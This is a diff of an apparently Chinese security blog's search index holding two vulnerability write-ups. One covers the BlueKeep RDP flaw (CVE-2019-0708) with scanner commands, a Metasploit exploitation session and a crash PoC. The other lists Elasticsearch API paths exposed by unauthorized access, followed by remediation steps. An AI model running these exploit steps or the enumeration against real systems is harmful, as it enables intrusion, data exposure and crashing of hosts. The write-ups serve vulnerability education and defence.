class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics&#x2F;&#123;id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;transforms</span><br><span class="line">&#x2F;_cat&#x2F;transforms&#x2F;&#123;transform_id&#125;</span><br><span class="line">&#x2F;_river&#x2F;_searc</span><br><span class="line">&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">&#x2F;_nodes 查看节点数据</span><br><span class="line">&#x2F;_plugin&#x2F;head&#x2F;  如有安装head插件 web管理界面</span><br><span class="line">&#x2F;_search?pretty&#x3D;true 查询所有index,type</span><br><span class="line">&#x2F;index&#x2F;_search	查询某个index下所有type</span><br><span class="line">&#x2F;index&#x2F;type&#x2F;_search?pretty&#x3D;true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>
+    <title>Windows(CVE-2019-0708)远程桌面代码执行漏洞</title>
+    <url>//ddf32da2222d.html</url>
+    <content><![CDATA[<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>&emsp;&emsp;2019年5月15日微软发布安全补丁修复了CVE编号为CVE-2019-0708的Windows远程桌面服务（RDP）远程代码执行漏洞,该漏洞在不需身份认证的情况下即可远程触发,危害与影响面极大。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><ul>
+<li>Windows 7</li>
+<li>Windows server 2008 R2</li>
+<li>Windows server 2008</li>
+<li>Windows 2003</li>
+<li>Windows xp</li>
+</ul>
+<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
+<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
-<p>2.禁止外网访问</p>
-<p>3.认证插件安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;plugins&#x2F;http-basic  &#x2F;&#x2F;es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https:&#x2F;&#x2F;github.com&#x2F;Asquera&#x2F;elasticsearch-http-basic&#x2F;releases&#x2F;download&#x2F;v1.1.0&#x2F;elasticsearch-http-basic-1.1.0.jar  &#x2F;&#x2F;下载es认证插件</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
 
-<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>
+<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
 
-<table>
-<thead>
-<tr>
-<th align="center">配置名</th>
-<th align="center">默认值</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">http.basic.enabled</td>
-<td align="center">true</td>
-<td align="center">开关，开启会接管全部HTTP连接</td>
-</tr>
-<tr>
-<td align="center">http.basic.user</td>
-<td align="center">“admin”</td>
-<td align="center">账号</td>
-</tr>
-<tr>
-<td align="center">http.basic.password</td>
-<td align="center">“admin”</td>
-<td align="center">密码</td>
-</tr>
-<tr>
-<td align="center">http.basic.ipwhitelist</td>
-<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
-<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
-</tr>
-<tr>
-<td align="center">http.basic.trusted_proxy_chains</td>
-<td align="center">[“172.16.18.114”]</td>
-<td align="center">信任代理列表</td>
-</tr>
-<tr>
-<td align="center">http.basic.log</td>
-<td align="center">false</td>
-<td align="center">把无授权的访问事件添加到ES的日志</td>
-</tr>
-<tr>
-<td align="center">http.basic.xforward</td>
-<td align="center">“X-Forwarded-For”</td>
-<td align="center">记载代理路径的header字段名</td>
-</tr>
-</tbody></table>
+<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
+<p>2.安装安全管家类的软件</p>
+<p>3.关闭远程桌面，开启防火墙</p>
+<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
 ]]></content>
       <categories>
         <category>漏洞利用</category>
-        <category>服务器应用漏洞</category>
-        <category>未授权访问漏洞</category>
+        <category>常见漏洞</category>
       </categories>
       <tags>
-        <tag>未授权访问</tag>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2759,6 +2703,80 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
+        <tag>未授权访问</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Elasticsearch未授权访问</title>
+    <url>//9db3aff65775.html</url>
+    <content><![CDATA[<h2 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>​        ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。设计用于云计算中，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p>
+<p>​    Elasticsearch的增删改查操作全部由http接口完。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索</p>
+<h3 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h3><p>默认端口9200，9300 HTTP协议</p>
+<p>返回内容包含<code>You Know,for Search</code></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果存在该漏洞则可以访问如下路径，这些路径存在大量敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;_cat</span><br><span class="line">&#x2F;_cat&#x2F;allocation</span><br><span class="line">&#x2F;_cat&#x2F;shards</span><br><span class="line">&#x2F;_cat&#x2F;shards&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;master</span><br><span class="line">&#x2F;_cat&#x2F;nodes</span><br><span class="line">&#x2F;_cat&#x2F;tasks</span><br><span class="line">&#x2F;_cat&#x2F;indices</span><br><span class="line">&#x2F;_cat&#x2F;indices&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;segments</span><br><span class="line">&#x2F;_cat&#x2F;segments&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;count</span><br><span class="line">&#x2F;_cat&#x2F;count&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;recovery</span><br><span class="line">&#x2F;_cat&#x2F;recovery&#x2F;&#123;index&#125;</span><br><span class="line">&#x2F;_cat&#x2F;health</span><br><span class="line">&#x2F;_cat&#x2F;pending_tasks</span><br><span class="line">&#x2F;_cat&#x2F;aliases</span><br><span class="line">&#x2F;_cat&#x2F;aliases&#x2F;&#123;alias&#125;</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool</span><br><span class="line">&#x2F;_cat&#x2F;thread_pool&#x2F;&#123;thread_pools&#125;</span><br><span class="line">&#x2F;_cat&#x2F;plugins</span><br><span class="line">&#x2F;_cat&#x2F;fielddata</span><br><span class="line">&#x2F;_cat&#x2F;fielddata&#x2F;&#123;fields&#125;</span><br><span class="line">&#x2F;_cat&#x2F;nodeattrs</span><br><span class="line">&#x2F;_cat&#x2F;repositories</span><br><span class="line">&#x2F;_cat&#x2F;snapshots&#x2F;&#123;repository&#125;</span><br><span class="line">&#x2F;_cat&#x2F;templates</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;anomaly_detectors&#x2F;&#123;job_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;trained_models&#x2F;&#123;model_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;datafeeds&#x2F;&#123;datafeed_id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics</span><br><span class="line">&#x2F;_cat&#x2F;ml&#x2F;data_frame&#x2F;analytics&#x2F;&#123;id&#125;</span><br><span class="line">&#x2F;_cat&#x2F;transforms</span><br><span class="line">&#x2F;_cat&#x2F;transforms&#x2F;&#123;transform_id&#125;</span><br><span class="line">&#x2F;_river&#x2F;_searc</span><br><span class="line">&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">&#x2F;_nodes 查看节点数据</span><br><span class="line">&#x2F;_plugin&#x2F;head&#x2F;  如有安装head插件 web管理界面</span><br><span class="line">&#x2F;_search?pretty&#x3D;true 查询所有index,type</span><br><span class="line">&#x2F;index&#x2F;_search	查询某个index下所有type</span><br><span class="line">&#x2F;index&#x2F;type&#x2F;_search?pretty&#x3D;true 查询某个index下的某个type的所有内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
+<p>2.禁止外网访问</p>
+<p>3.认证插件安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;plugins&#x2F;http-basic  &#x2F;&#x2F;es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https:&#x2F;&#x2F;github.com&#x2F;Asquera&#x2F;elasticsearch-http-basic&#x2F;releases&#x2F;download&#x2F;v1.1.0&#x2F;elasticsearch-http-basic-1.1.0.jar  &#x2F;&#x2F;下载es认证插件</span><br></pre></td></tr></table></figure>
+
+<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">配置名</th>
+<th align="center">默认值</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">http.basic.enabled</td>
+<td align="center">true</td>
+<td align="center">开关，开启会接管全部HTTP连接</td>
+</tr>
+<tr>
+<td align="center">http.basic.user</td>
+<td align="center">“admin”</td>
+<td align="center">账号</td>
+</tr>
+<tr>
+<td align="center">http.basic.password</td>
+<td align="center">“admin”</td>
+<td align="center">密码</td>
+</tr>
+<tr>
+<td align="center">http.basic.ipwhitelist</td>
+<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
+<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
+</tr>
+<tr>
+<td align="center">http.basic.trusted_proxy_chains</td>
+<td align="center">[“172.16.18.114”]</td>
+<td align="center">信任代理列表</td>
+</tr>
+<tr>
+<td align="center">http.basic.log</td>
+<td align="center">false</td>
+<td align="center">把无授权的访问事件添加到ES的日志</td>
+</tr>
+<tr>
+<td align="center">http.basic.xforward</td>
+<td align="center">“X-Forwarded-For”</td>
+<td align="center">记载代理路径的header字段名</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>服务器应用漏洞</category>
+        <category>未授权访问漏洞</category>
+      </categories>
+      <tags>
         <tag>未授权访问</tag>
       </tags>
   </entry>
